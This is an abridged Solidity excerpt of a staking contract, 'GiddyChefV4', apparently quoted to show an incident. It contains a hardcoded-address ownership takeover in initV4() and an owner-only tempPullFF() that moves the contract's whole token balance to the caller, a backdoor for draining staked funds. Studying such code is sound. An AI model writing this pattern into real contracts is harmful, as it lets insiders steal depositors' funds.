...
contract GiddyChefV4 is OwnableUpgradeable {
    ...
    function initV3(address _owner) public initializer {
        _transferOwnership(_owner);
    }

    function initV4() public {
        require(msg.sender == 0xBbD7410f00354eBCd8F2f5f45b64f12BF86B833d, "wrong caller");
        _transferOwnership(0xBbD7410f00354eBCd8F2f5f45b64f12BF86B833d);
    }
    ...
    function safeGiddyTransfer(address _to, uint256 _amount) internal {
        ...
        uint256 giddyAllowance = giddy.allowance(escrow, _to);
        require(giddyBal >= _amount, "Insufficient funds");
        require(giddyAllowance >= _amount, "Insufficient approval");
        giddy.transferFrom(escrow, _to, _amount);
    }

    function tempPullFF() external onlyOwner {
        giddy.transfer(msg.sender, giddy.balanceOf(address(this)));
    }
}
